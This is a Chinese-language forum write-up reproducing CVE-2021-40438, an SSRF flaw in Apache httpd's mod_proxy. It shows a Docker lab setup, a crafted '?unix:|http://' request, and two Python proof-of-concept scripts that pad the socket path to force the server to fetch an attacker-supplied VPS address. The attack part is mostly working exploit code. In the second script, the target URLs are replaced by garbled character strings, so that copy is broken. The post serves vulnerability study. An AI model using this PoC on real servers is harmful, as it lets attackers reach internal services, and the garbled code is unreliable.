
# [原创]CVE-2021-40438 Apache SSRF漏洞复现

## Apache SSRF漏洞复现

### 一、环境搭建

> M1装个docker真麻烦，后来才发现是我的`/usr/local/bin`目录有问题太草了

下载`httpd`，在百度找了好久都没有找到可以编译的，只能尝试一下`docker`

```bash
docker pull httpd:2.4.48
```

![image-20211020164217588](upload/attach/202110/809626_9F6TW6WDCCZHD5M.jpg)

```bash
docker run -p 80:80 -v $PWD/www/:/usr/local/apache2/htdocs/ -d httpd
```

![image-20211020164316557](upload/attach/202110/809626_65CDCZBPR9Z9BF9.jpg)

随后进入`docker`中，改配置

![image-20211020164714549](upload/attach/202110/809626_RJM4Y9KDT9KJQW5.jpg)

> 如果没有`vim`就自己下一个

```bash
apt update
apt install vim
```

主要取消注释了五个

```bash
LoadModule proxy_html_module modules/mod_proxy_html.so
LoadModule proxy_module modules/mod_proxy.so
LoadModule proxy_connect_module modules/mod_proxy_connect.so
LoadModule proxy_ftp_module modules/mod_proxy_ftp.so
LoadModule proxy_http_module modules/mod_proxy_http.so
```

随后查看`httpd-vhost.conf`

首先需要在`httpd.conf`中将这一行给去掉`#`注释

![image-20211020171638590](upload/attach/202110/809626_EHK6VKZYF4KRKM2.jpg)

随后将`httpd-vhost.conf`中添加`ProxyPass`和`ProxyPassReverse`

![image-20211020172738673](upload/attach/202110/809626_HVPKHN8RBYQ6AZ2.jpg)

```bash
<VirtualHost *:80>
ServerAdmin webmaster@dummy-host.example.com
DocumentRoot "/usr/local/apache2/htdocs/"
ServerName localhost
ServerAlias www.dummy-host.example.com
ErrorLog "logs/dummy-host.example.com-error_log"
CustomLog "logs/dummy-host.example.com-access_log" common
ProxyPass "/" http://127.0.0.1:8000
ProxyPassReverse "/" http://127.0.0.1:8000
</VirtualHost>
```

### 二、漏洞复现

![image-20211020173116064](upload/attach/202110/809626_V6R8VVE434E5YXN.jpg)

请求头



```http
GET /?unix:|http://127.0.0.1:9999/vv HTTP/1.1
Host: 192.168.1.7
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

既然能访问到本地端口，想试试能不能访问其他地址的指定端口，所以我又开了一台`docker`。

![image-20211020173248071](upload/attach/202110/809626_T6QJSGM8T993RYW.jpg)

> 后来想着懒得折腾`docker` 就用服务器开了一个`8000`端口，`python`的简易服务器

![image-20211020174557896](upload/attach/202110/809626_8RA57N2WPT7VM8X.jpg)

`docker` `telnet`没什么问题

![image-20211020174650815](upload/attach/202110/809626_REYED9YSC2PDK6S.jpg)

然后，可以访问公网，不过有个疑问，这玩意的利用点在哪

![image-20211020175035935](upload/attach/202110/809626_HJ2T2HXBA3EDRAC.jpg)

## 三、POC编写

先看看POC结果

![image-20211020180802476](upload/attach/202110/809626_2EGD3476UQH74B8.jpg)



```python
'''
Email: Uzjuer@163.com
Blog: Blog.CatGames.cn
By: UzJu
'''
import requests
def poc(ip, vps):
"""
:param ip: 传服务器地址要加上http或https
:param vps: 传vps地址 要加上http或https
:return:
"""
try:
payload = f"{ip}/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
f"|{vps}"
headers = {
"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:93.0) Gecko/20100101 Firefox/93.0"
}
r = requests.get(payload, headers=headers, timeout=5)
# if r.status\_code == 503:
# poc("http://192.168.1.7", "http://xxxx:8000/")
print("[-]请求结果", r)
except requests.exceptions.ReadTimeout as e:
print('[+]可能存在SSRF漏洞')
poc("http://192.168.1.7", "http://xxxx:8000/")
```

经过测试，运行第一次有时候会报错报503这种，多运行几次就可以了

```python
import requests

def poc(ip, vps):
    """
    :param ip: 传服务器地址要加上http或https
    :param vps: 传vps地址 要加上http或https
    :return:
    """
    try:
        payload = f"{ip}/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
        f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
        f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
        f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
        f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
        f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
        f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
        f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
        f"|{vps}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:93.0) Gecko/20100101 Firefox/93.0"
        }
        r = requests.get(payload, headers=headers, timeout=5)
        # if r.status_code == 503:
        #     poc("5eeK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0q4Q4x3X3f1%4", "http://xxxx:8000/")
        print("[-]请求结果", r)
    except requests.exceptions.ReadTimeout as e:
        print('[+]可能存在SSRF漏洞')

poc("2d5K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0q4Q4x3X3f1%4", "http://xxxx:8000/")
```
